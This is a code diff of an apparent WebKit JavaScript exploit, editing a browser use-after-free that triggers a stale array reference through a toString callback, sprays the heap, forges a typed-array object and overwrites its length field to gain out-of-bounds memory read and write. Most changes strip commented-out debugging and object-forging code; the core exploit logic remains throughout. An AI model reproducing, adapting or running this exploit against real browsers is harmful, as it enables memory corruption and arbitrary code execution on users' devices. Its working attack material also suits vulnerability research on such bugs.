@@ -82,18 +82,6 @@ for(var i = 0; i < 0x1000; i++) {
 function allocbufptrs() {
 	if(bufs[0]) return;
 	dgc();
-	/*
-	dgc();
-	dgc();
-	dgc();
-	dgc();
-	dgc();
-	dgc();
-	dgc();
-	dgc();
-	dgc();
-	dgc();
-	*/
 	
 	// Create 0x200 FFFF:0000:4141:4141 integer objects
 	for(i = 0; i < bufs.length; i++) {
@@ -121,10 +109,11 @@ function go_() {
 	var arr = new Array(0x100);
 	
 	arr[0] = 0x1;
+	
 	//var yolo = new ArrayBuffer(0x125);
 	//arr[0] = yolo;
-	
 	//arr[1] = 0x13371337;
+	
 	var not_number = {};
 	not_number.toString = function() {
 		arr = null;
@@ -153,32 +142,18 @@ function go_() {
 	var stale = target.stale;
 
 	if(before_len != stale.length){
-		alert("Exploit Worked v3");
+		alert("Exploit Worked");
 		keep(arr);
 	} else {
-		//alert("Exploit Failed");
 		document.location.reload();
 		return;
 	}
 	
-	//alert("before gc");
-	//dgc();
-	//dgc();
-	//dgc();
-
-
-	//alert("after gc");
+	// For some reason improves stability
 	sleep(1000);
-	alert("after sleep");
-	//return;
-	
+
 	stale[0] += 0x101;
 
-	// Call the function 0x1000 times to force JavascriptCore to mark it as high-usage and JIT it.
-	// This will force JS to create a r/w/x block of memory, with raw machine code,
-	// this block can then be written to.
-	//for (var z = 0; z < 0x1000; z++) fc();
-	//alert("After jitted code");
 
 	for(i = 0; i < bufs.length; i++) {
 		for(k = 0; k < bufs[0].length; k++) {
@@ -186,20 +161,6 @@ function go_() {
 			// If this is true then stale[0] points to the same thing as bufs[i][k]
 			if(bufs[i][k] == 0x41414242) {
 				alert("Found the object!!");
-				
-				// Leak function pointer
-				//stale[0] = fc;
-				//fcp = bufs[i][k];
-				//alert("Leaked function pointer:" + fcp)
-
-
-				
-				//var original_val = bufs[i][k];
-				//var original_val1 = bufs[i][k+1];
-				//alert("Pushed stale");
-				//bufs.push(stale);
-				//stale[0] = fc;
-				//fcp = bufs[i][k];
 
 				stale[0] = {
 					//'a': u2d(105, 0x1172600), // the JSObject properties
@@ -236,36 +197,6 @@ function go_() {
 				alert("Orginal smsh len:" + smsh.length);
 				stale[0][6] = 0xffffffff; // Overide m_length field
 				alert("New smsh len:" + smsh.length);
-				
-				bck = stale[0][4];
-				// stale[0][5] = 1; // address, high 32 bits == 0x100000000
-				stale[0][4] = 0; // address, low 32 bits
-				mem0 = stale[0];
-				mem1 = bck;
-				mem2 = smsh;
-				bufs.push(stale)
-				alert("Done doing stuff I don't understand");
-
-				if(smsh.length != 0x10) {
-					smashed(stale[0]);
-				}
-
-				/*
-				stale[0] = {
-					// 'a' is the forged JSCell header
-					// m_structureID = 105 // Struct ID for Uint32ArrayType (Changes on runtime, how did this work?)
-					// m_indexingType = 0x0
-					// m_type = 0x26 // Assumingly Uint32ArrayType on the version of webkit this was made on.
-					// m_flags = 0x72
-					// m_gcData (or m_cellState?) = 0x11
- 					'a': u2d(105, 0x1172600),
-					
-					// 'b' - 'd' are the forged JSArrayBufferView
- 					'b': u2d(0, 0),		// butterfly ptr (Does this exist on the version of wk the switch is using?)
- 					'c': smsh,		// void* m_vector
- 					'd': u2d(0x100, 0)	// uint32_t m_length;
- 				}
-				*/
 				return;
 			}
 		}
@@ -276,7 +207,6 @@ function go_() {
 }
 
 function go() {
-	//alert("ready?");
 	dgc();
 	dgc();
 	dgc();
